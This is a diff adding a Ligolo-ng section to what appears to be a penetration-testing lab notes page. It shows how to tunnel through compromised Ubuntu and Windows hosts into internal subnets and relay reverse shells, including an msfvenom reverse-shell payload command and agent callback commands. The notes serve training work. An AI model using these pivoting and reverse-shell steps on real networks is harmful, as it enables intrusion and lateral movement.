@@ -408,3 +408,246 @@ Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecre
 {% endcode %}
 
 <figure><img src="../.gitbook/assets/image (1800).png" alt=""><figcaption></figcaption></figure>
+
+## Ligolo-ng&#x20;
+
+Ligolo-ng builds a tunnel and connects it to a **virtual network card (a TUN interface)** on your Kali machine. Once you add a route to that virtual card, Kali _believes_ it's physically plugged into the target's internal network. No proxy wrapper, no proxychains.conf, nmap just works.
+
+**Components**&#x20;
+
+* **Proxy (server)** — runs on your Kali attack box.
+* **Agent** — a small binary you run on the machine you've compromised (Ubuntu, in your case).
+
+{% hint style="info" %}
+_On the agent side, no admin/root access is required at all — everything can be performed without administrative access. However, on the relay/proxy server (your Kali box), you do need to be able to create a tun interface_
+{% endhint %}
+
+### Ligolo-ng Setup&#x20;
+
+<figure><img src="../.gitbook/assets/ChatGPT Image Aug 20, 2026, 06_51_00 PM.png" alt=""><figcaption></figcaption></figure>
+
+### Starting the Ligolo-Ng proxy&#x20;
+
+On Kali, we started the proxy using self-signed certificates:
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+sudo ligolo-proxy --selfcert
+```
+{% endcode %}
+
+The first run generated the configuration file and enabled the Web UI (not implemented officially)
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 111353.png" alt=""><figcaption></figcaption></figure>
+
+### Connecting the Ubuntu Agent&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+./agent -connect <kali ip>:<kali port> -ignore-cert
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 112019.png" alt=""><figcaption></figcaption></figure>
+
+At this point, the proxy knows about the Ubuntu pivot, but **traffic is not yet being routed through it**.
+
+In Kali we'll get a notification that an Agent has joined us.&#x20;
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 112039.png" alt=""><figcaption></figcaption></figure>
+
+### Connecting to session&#x20;
+
+Select the Ubuntu agent as our session. This changes the terminal context; then check the active tunnels.
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+session
+tunnel_list
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1957).png" alt=""><figcaption></figcaption></figure>
+
+### Starting the first tunnel&#x20;
+
+Start the tunnel to establish a connection to the Ubuntu host.
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+tunnel_start --tun ligolo
+tunnel_list
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1958).png" alt=""><figcaption></figcaption></figure>
+
+We can see that an interface named `ligolo` has been created, which acts as the tunnel to the Ubuntu host.
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 113242.png" alt=""><figcaption></figcaption></figure>
+
+We can also check the interfaces from the Ligolo-ng prompt.&#x20;
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 113358.png" alt=""><figcaption></figcaption></figure>
+
+### Creating first route&#x20;
+
+So far, we have created the tunnel, but traffic will not yet pass through it because Kali does not know that the tunnel can be used to reach the internal network. We therefore need to configure the route.
+
+There are two ways to configure it:
+
+1. **Manual** — covered later
+2. **Automatic** — using `autoroute`
+
+Here, we used `autoroute`, selected the required subnet using the arrow keys to navigate and the **Spacebar** to select it, and then created a new interface named `internal1`. **We could also choose to use an existing interface, such as the `ligolo` interface created earlier, instead of creating `internal1`.** This configures the route to the internal network through the selected tunnel/interface.
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+autoroute
+# <arrow keys to navigate>
+# <spacebar for selecting>
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 114110.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 114323.png" alt=""><figcaption></figcaption></figure>
+
+Upon creation, we can see that a new interface named `internal1` appears, which will now route our traffic to the internal network.
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 114350.png" alt=""><figcaption></figcaption></figure>
+
+### Verifying access to the first internal network&#x20;
+
+And now, as shown in the screenshot, `fping` confirms that the `10.10.20.129` machine is alive, and we can connect to it via RDP using the provided credentials.
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 114645.png" alt=""><figcaption></figcaption></figure>
+
+After configuring the route, we can use `route_list` to view the active routing table, as shown in the screenshot.
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+route_list
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1959).png" alt=""><figcaption></figcaption></figure>
+
+### Ligolo-Ng Listener
+
+After connecting to the RDP session, we attempted to obtain a reverse shell, but the connection failed. The tunnel allows Kali to reach the internal network through the pivot host, but it does not automatically provide a reverse path for the internal host to connect back to Kali. As shown in the screenshot, the `Test-NetConnection` request fails even though the destination port is open.
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+Test-NetConnection 10.10.10.128 -Port 8081
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 115710.png" alt=""><figcaption></figcaption></figure>
+
+So, we created a Ligolo-ng listener on the Ubuntu host to listen on port `8082` and forward the traffic it receives to port `8081` on our Kali VM.
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+listener_add --addr 0.0.0.0:8082 --to 127.0.0.1:8081 --tcp
+listener_list
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 115855.png" alt=""><figcaption></figcaption></figure>
+
+After creating the listener, we generated a reverse shell payload using `msfvenom` that connects to `10.10.20.128` on port `8082`. Since the Ligolo-ng listener on Ubuntu is listening on port `8082`, it receives the connection and forwards it to port `8081` on our Kali VM.
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<pivot host IP> LPORT=<pivot host port> -f exe -o rev_shell.exe
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 121228.png" alt=""><figcaption></figcaption></figure>
+
+Upon executing the executable, we successfully obtained the reverse shell as planned.
+
+<figure><img src="../.gitbook/assets/image (1960).png" alt=""><figcaption></figcaption></figure>
+
+### Turning the Standalone Windows Host into a second pivot&#x20;
+
+Since we now need to gain access to the Windows domain-joined machine, we will use the Windows standalone host as our second pivot. We therefore created another Ligolo-ng listener on Ubuntu that listens on port `4444` and forwards the traffic to port `11601` on our Kali VM, which is the Ligolo-ng listener used to manage agents.
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601 --tcp
+listener_list
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 121636.png" alt=""><figcaption></figcaption></figure>
+
+Now, let’s execute the Ligolo-ng agent on the Windows standalone machine so that it connects to the Ligolo-ng proxy running on our Kali VM.
+
+{% code overflow="wrap" expandable="true" %}
+```cmd
+.\agent.exe -connect 10.10.20.128:4444 -ignore-cert
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1961).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 122507.png" alt=""><figcaption></figcaption></figure>
+
+### Creating the second tunnel&#x20;
+
+Now, let’s create another tunnel to the second pivot, which will allow us to access the second internal network.
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+interface create --name internal2
+interface_add_route --name internal2 --route 10.10.30.0/24
+tunnel_start --tun internal2
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 122854.png" alt=""><figcaption></figcaption></figure>
+
+Upon creation, we can see that a new interface named `internal2` appears, which will now route our traffic to the second internal network.
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 122912.png" alt=""><figcaption></figcaption></figure>
+
+### Verifying the Second Route
+
+And now, as shown in the screenshot, `fping` confirms that the `10.10.30.129` machine is alive, and we can connect to it via RDP using the provided credentials.
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 123737.png" alt=""><figcaption></figcaption></figure>
+
+### Reverse Shell from the second internal network&#x20;
+
+To obtain a reverse shell from the second internal network, we again need to create a listener on the Windows standalone machine. The Windows domain-joined machine will send its connection to port `8083` on the Windows standalone host, which will then forward the traffic back to port `8081` on our Kali machine.
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+listener_add --addr 0.0.0.0:8083 --to 127.0.0.1:8081 --tcp
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 124527.png" alt=""><figcaption></figcaption></figure>
+
+#### **Getting the shell**&#x20;
+
+<figure><img src="../.gitbook/assets/image (1962).png" alt=""><figcaption></figcaption></figure>
+
+### Cleanup&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+session
+tunnel_list
+tunnel_stop
+interface_list
+interface_delete --name <interface>
+route_list
+interface_delete_route --name <interface> --route <network>/<mask>
+listener_list
+listener_remove --id <listener_id>
+exit
+```
+{% endcode %}
